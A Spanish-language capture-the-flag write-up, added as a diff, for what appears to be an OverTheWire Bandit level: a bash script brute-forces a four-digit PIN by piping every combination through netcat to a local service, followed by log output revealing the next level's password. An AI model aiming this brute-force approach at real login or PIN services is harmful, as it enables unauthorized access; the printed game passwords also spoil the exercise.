@@ -1,0 +1,43 @@
+Para este desafio es necesario crear un bucle for que recorra los 
+valores desde 0 a 9999, los añada al final de la contraseña con un 
+espacio de separacion y lo envie al puerto en escucha 30002. Para esto 
+se ha usado el siguiente script:
+
+#!/bin/bash
+echo "Inicio"
+
+#Funcion para obtener un numero de 4 digitos dado otro
+#no es necesaria al final, pese a que pida 4 digitos.
+get4DigitsNumber(){
+  repeatD=$((4 - ${#1}))
+  
+  digits="$1"
+  for ((j=0;j<$repeatD;j++));
+  do
+     digits="0${digits}"
+  done
+  echo $digits
+}
+
+#Loop para recorrer del 0 al 9999 y generar la contraseña
+for ((i=0;i<=9999;i++));
+do
+  
+  password="VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar $i"
+  echo $password
+# Se envia el output del bucle mediante una pipeline a netcat, y se 
+#almacena el resultado en un log
+done | nc localhost 30002 >> logesito.log
+
+echo "FIN $0"
+
+
+
+#Tras lanzar el script, el resultado es el siguiente
+cat logesito.log | tail -8
+Wrong! Please enter the correct pincode. Try again.
+Wrong! Please enter the correct pincode. Try again.
+Wrong! Please enter the correct pincode. Try again.
+Wrong! Please enter the correct pincode. Try again.
+Correct!
+The password of user bandit25 is p7TaowMYrmu23Ol8hiZh9UvD0O9hpx8d
